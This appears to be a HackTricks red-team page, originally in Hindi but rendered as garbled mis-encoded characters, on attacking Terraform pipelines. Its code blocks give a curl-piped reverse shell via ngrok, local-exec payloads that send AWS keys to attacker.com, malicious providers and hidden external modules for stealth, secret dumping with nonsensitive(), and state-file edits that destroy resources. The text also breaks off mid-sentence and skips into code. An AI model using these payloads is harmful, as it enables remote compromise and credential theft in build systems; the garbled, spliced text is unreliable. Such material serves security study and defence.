# рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рд╕реБрд░рдХреНрд╖рд╛

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореЗрд░рд╛** рдЯреНрд╡рд┐рдЯрд░ ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

## рдореМрд▓рд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

[рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform рдПрдХ **рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЛрдб рдЙрдкрдХрд░рдг** рд╣реИ рдЬреЛ рдЖрдкрдХреЛ рдорд╛рдирд╡-рдкрдардиреАрдп рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ **рдХреНрд▓рд╛рдЙрдб рдФрд░ рдСрди-рдкреНрд░реЗрдо рд╕рдВрд╕рд╛рдзрдиреЛрдВ** рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рджреЗрддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рд╕рдВрд╕реНрдХрд░рдг, рдкреБрдирдГ рдЙрдкрдпреЛрдЧ рдФрд░ рд╕рд╛рдЭрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдлрд┐рд░ рдЖрдк рдПрдХ рд╕рдВрд░рдЪрд┐рдд рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╕рднреА рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХреЛ рдкреНрд░рд╛рд╡рдзрд╛рди рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдирд┐рдореНрди рд╕реНрддрд░реАрдп рдШрдЯрдХреЛрдВ рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ рдХрдВрдкреНрдпреВрдЯ, рд╕реНрдЯреЛрд░реЗрдЬ, рдФрд░ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рд╕рдВрд╕рд╛рдзрди, рд╕рд╛рде рд╣реА DNS рдПрдВрдЯреНрд░реАрдЬ рдФрд░ SaaS рд╕реБрд╡рд┐рдзрд╛рдПрдВ рдЬреИрд╕реЗ рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп рдШрдЯрдХред

### рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ?

рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдмрд╛рджрд▓ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдореЛрдВ рдФрд░ рдЕрдиреНрдп рд╕реЗрд╡рд╛рдУрдВ рдкрд░ рд╕рдВрд╕рд╛рдзрди рдмрдирд╛рддрд╛ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ рдЙрдирдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рдЗрдВрдЯрд░рдлреЗрд╕ (APIs) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗред рдкреНрд░рджрд╛рддрд╛рдПрдВ рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдХреЛ рдХрд┐рд╕реА рднреА рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдпрд╛ рд╕реЗрд╡рд╛ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рджреЗрддреА рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдкрд╣реБрдВрдЪрдиреЗ рдпреЛрдЧреНрдп API рд╣реЛред

![](<../.gitbook/assets/image (33).png>)

HashiCorp рдФрд░ рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рд╕рдореБрджрд╛рдп рдиреЗ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА **1700 рд╕реЗ рдЕрдзрд┐рдХ рдкреНрд░рджрд╛рддрд╛рдУрдВ** рдХреЛ рд▓рд┐рдЦрд╛ рд╣реИ рдЬреЛ рд╣рдЬрд╛рд░реЛрдВ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдФрд░ рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИрдВ, рдФрд░ рдпрд╣ рд╕рдВрдЦреНрдпрд╛ рдмрдврд╝рддреА рдЬрд╛ рд░рд╣реА рд╣реИред рдЖрдк рд╕рднреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЙрдкрд▓рдмреНрдз рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХреЛ [рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рд░рдЬрд┐рд╕реНрдЯреНрд░реА](https://registry.terraform.io/) рдкрд░ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ рдЕрдореЗрдЬрд╝рди рд╡реЗрдм рд╕реЗрд╡рд╛рдПрдВ (AWS), рдПрдЬрд╝реНрдпреВрд░, рдЧреВрдЧрд▓ рдХреНрд▓рд╛рдЙрдб рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо (GCP), рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝, рд╣реЗрд▓реНрдо, рдЧрд┐рдЯрд╣рдм, рд╕реНрдкреНрд▓рдВрдХ, рдбреЗрдЯрд╛рдбреЙрдЧ, рдФрд░ рдмрд╣реБрдд рдХреБрдЫ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

рдореВрд▓ рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рддреАрди рдЪрд░рдгреЛрдВ рд╕реЗ рдорд┐рд▓рдХрд░ рдмрдирддрд╛ рд╣реИ:

* **рд▓рд┐рдЦреЗрдВ:** рдЖрдк рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдЬреЛ рдХрд┐ рдХрдИ рдХреНрд▓рд╛рдЙрдб рдкреНрд░рджрд╛рддрд╛рдУрдВ рдФрд░ рд╕реЗрд╡рд╛рдУрдВ рдкрд░ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрдиреЛрдВ рдкрд░ рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдХреНрд▓рд╛рдЙрдб (VPC) рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдореВрд╣реЛрдВ рдФрд░ рдПрдХ рд▓реЛрдб рдмреИрд▓реЗрдВрд╕рд░ рдбрд┐рдкреНрд▓реЙрдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред
* **рдпреЛрдЬрдирд╛:** рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдПрдХ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЬрдирд╛ рдмрдирд╛рддрд╛ рд╣реИ рдЬреЛ рдЖрдкрдХреА рдореМрдЬреВрджрд╛ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдФрд░ рдЖрдкрдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реЛрдХрд░ рдЙрд╕ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХреЛ рдмрдирд╛рдПрдЧрд╛, рдЕрдкрдбреЗрдЯ рдХрд░реЗрдЧрд╛, рдпрд╛ рдирд╖реНрдЯ рдХрд░реЗрдЧрд╛ред
* **рд▓рд╛рдЧреВ рдХрд░реЗрдВ:** рдордВрдЬреВрд░реА рдкрд░, рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рд╕рд╣реА рдХреНрд░рдо рдореЗрдВ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рдЖрдкрд░реЗрд╢рди рдХрд░реЗрдЧрд╛, рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХрд╛ рд╕рдореНрдорд╛рди рдХрд░рддреЗ рд╣реБрдПред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдПрдХ VPC рдХреА рдЧреБрдгрд╡рддреНрддрд╛ рдХреЛ рдЕрдкрдб
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### рдПрдХ рдХрд╕реНрдЯрдо рдкреНрд░рджрд╛рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ

рдПрдХ рд╣рдорд▓рд╛рд╡рд┐рдорд╛рдирдХрд░реНрддрд╛ рдПрдХ [рдХрд╕реНрдЯрдо рдкреНрд░рджрд╛рддрд╛](https://learn.hashicorp.com/tutorials/terraform/provider-setup) рдХреЛ [рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рд░рдЬрд┐рд╕реНрдЯреНрд░реА](https://registry.terraform.io/) рдкрд░ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдХреЛрдб рдореЗрдВ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ рдПрдХ рдлреАрдЪрд░ рдмреНрд░рд╛рдВрдЪ рдореЗрдВ ([рдпрд╣рд╛рдБ рд╕реЗ рдЙрджрд╛рд╣рд░рдг](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
рдкреНрд░рджрд╛рддрд╛ `init` рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЬрдм `plan` рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдХреЛрдб рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЖрдк рдПрдХ рдЙрджрд╛рд╣рд░рдг [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec) рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

#### рдПрдХ рдмрд╛рд╣рд░реА рд╕рдВрджрд░реНрдн рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ

рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рд╡рд┐рдХрд▓реНрдк рджреЛрдиреЛрдВ рдЙрдкрдпреЛрдЧреА рд╣реИрдВ рд▓реЗрдХрд┐рди рдмрд╣реБрдд рдЧреБрдкреНрдд (рджреВрд╕рд░рд╛ рдкрд╣рд▓реЗ рд╕реЗ рдЕрдзрд┐рдХ рдЧреБрдкреНрдд рд╣реИ рд▓реЗрдХрд┐рди рдкрд╣рд▓реЗ рд╕реЗ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рд╣реИ)ред рдЖрдк рдЗрд╕ рд╣рдорд▓рд╛ рднреА рдПрдХ **рдФрд░ рдЧреБрдкреНрдд рддрд░реАрдХреЗ рд╕реЗ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрди рд╕реБрдЭрд╛рд╡реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ:

* рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд░реЗрд╡ рд╢реИрд▓ рдирд┐рд░реНрджреЗрд╢рд┐рдд рд░реВрдк рд╕реЗ рдЬреЛрдбрд╝рдиреЗ рдХреА рдмрдЬрд╛рдп, рдЖрдк рдПрдХ рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрди **рд▓реЛрдб** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рд░реЗрд╡ рд╢реИрд▓ рд╣реИ:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
рдЖрдк [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules) рдореЗрдВ rev shell рдХреЛрдб рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

* рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрди рдореЗрдВ, **ref** рдлреАрдЪрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ **рд░реЗрдкреЛ рдХреЗ рднреАрддрд░ рдПрдХ рд╢рд╛рдЦрд╛ рдореЗрдВ terraform rev shell рдХреЛрдб рдЫреБрдкрд╛** рдЬрд╛ рд╕рдХреЗ, рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **local-exec** рдХреЗ рд╕рд╛рде рдПрдХ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг Terraform рдлрд╝рд╛рдЗрд▓ рдбрд╛рд▓рдХрд░**ред**\
рдЖрдкрдХреЛ рд╕рд┐рд░реНрдл рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдХреБрдЫ рдкреЗрд▓реЛрдб рдЬреИрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдПрдХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛрддреЗ рд╣реИрдВ:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
рдЕрдЧрд▓реА рддрдХрдиреАрдХ рд╕реЗ рд╕реБрдЭрд╛рд╡реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ рдФрд░ рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдмрд╛рд╣рд░реА рд╕рдВрджрд░реНрднреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдПрдХ рдЧреБрдкреНрдд рддрд░реАрдХреЗ рд╕реЗ** рдХрд░реЗрдВред

## рд░рд╣рд╕реНрдп рдбрдВрдк

рдЖрдк рдЯреЗрд░рд╛реЮреЙрд░реНрдо рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ **рдЧреБрдкреНрдд рдореВрд▓реНрдпреЛрдВ рдХреЛ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** `terraform apply` рдЪрд▓рд╛рдХрд░ рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдХреБрдЫ рдЬреЛрдбрд╝рдХрд░:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Terraform рд╕реНрдерд┐рддрд┐ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЯреЗрд░рд╛реЮреЙрд░реНрдо рд╕реНрдерд┐рддрд┐ рдлрд╝рд╛рдЗрд▓реЛрдВ рдкрд░ рд▓реЗрдЦрди рдЕрдзрд┐рдХрд╛рд░ рд╣реИ рд▓реЗрдХрд┐рди рдЖрдк рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдХреЛрдб рдирд╣реАрдВ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ, [**рдпрд╣ рд╢реЛрдз**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рд╡рд┐рдХрд▓реНрдк рджреЗрддрд╛ рд╣реИ рдЬрд┐рдирдХрд╛ рдлрд╝рд╛рдЗрд▓ рд╕реЗ рд▓рд╛рдн рдЙрдард╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

### рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд╣рдЯрд╛рдирд╛ <a href="#deleting-resources" id="deleting-resources"></a>

рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдирд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ 2 рддрд░реАрдХреЗ рд╣реИрдВ:

1. **рд╕реНрдерд┐рддрд┐ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдПрдХ рд╕рдВрд╕рд╛рдзрди рдбрд╛рд▓реЗрдВ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд╣реЛ рдФрд░ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдВрд╕рд╛рдзрди рдХреА рдУрд░ рдкреЛрдЗрдВрдЯ рдХрд░реЗрдВ рдЬрд┐рд╕реЗ рдирд╖реНрдЯ рдХрд░рдирд╛ рд╣реИ**

рдХреНрдпреЛрдВрдХрд┐ рдЯреЗрд░рд╛реЮреЙрд░реНрдо рджреЗрдЦреЗрдЧрд╛ рдХрд┐ рд╕рдВрд╕рд╛рдзрди рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЗрд╕реЗ рдирд╖реНрдЯ рдХрд░ рджреЗрдЧрд╛ (рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдВрд╕рд╛рдзрди ID рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реБрдП)ред рдкрд┐рдЫрд▓реЗ рдкреГрд╖реНрда рд╕реЗ рдЙрджрд╛рд╣рд░рдг:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **рд╕рдВрд╕рд╛рдзрди рдХреЛ рдРрд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ рдЬрд┐рд╕реЗ рдЕрдкрдбреЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реЛ (рддрд╛рдХрд┐ рдЗрд╕реЗ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рдП рдФрд░ рдкреБрдирдГ рдмрдирд╛рдпрд╛ рдЬрд╛рдП)**

рдПрдХ EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рд▓рд┐рдП, рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рдкреНрд░рдХрд╛рд░ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рдХрд╛рдлреА рд╣реИ рддрд╛рдХрд┐ рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдЙрд╕реЗ рд╣рдЯрд╛ рджреЗрдВ рдФрд░ рдкреБрдирдГ рдмрдирд╛рдПрдВред

### RCE

рдПрдХ рдХрд╕реНрдЯрдо рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ [рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) рдФрд░ рдЯреЗрд░рд╛реЮреЙрд░реНрдо рд╕реНрдЯреЗрдЯ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдПрдХ рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдХреЛ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕реЗ рдЦреБрдж рдХрд╛ рдпрд╛ рдПрдХ рдЦрд╛рд▓реА рд╕рдВрд╕рд╛рдзрди рдХреЗ рд╕рд╛рде рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдХреЛ рдЬреЛрдбрд╝рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИред рдореВрд▓ рдЕрдиреБрд╕рдВрдзрд╛рди рд╕реЗ рдЙрджрд╛рд╣рд░рдг:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
## рдордВрдЬреВрд░реА рдЙрдкрдХрд░рдг

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec рдЖрдкрдХреЗ рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдХреЛрдб рдХрд╛ рд╕реНрдереИрддрд┐рдХ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕рдВрднрд╛рд╡рд┐рдд рдЧрд▓рддрд┐рдпреЛрдВ рдХреЛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХреЗред
* [**terascan**](https://github.com/tenable/terrascan): Terrascan рдПрдХ рд╕реНрдереИрддрд┐рдХ рдХреЛрдб рд╡рд┐рд╢реНрд▓реЗрд╖рдХ рд╣реИ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдПрд╕ рдХреЛрдб рдХреЗ рд▓рд┐рдПред

## рд╕рдВрджрд░реНрдн

* [рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ рд╕реБрд░рдХреНрд╖рд╛](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks** рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
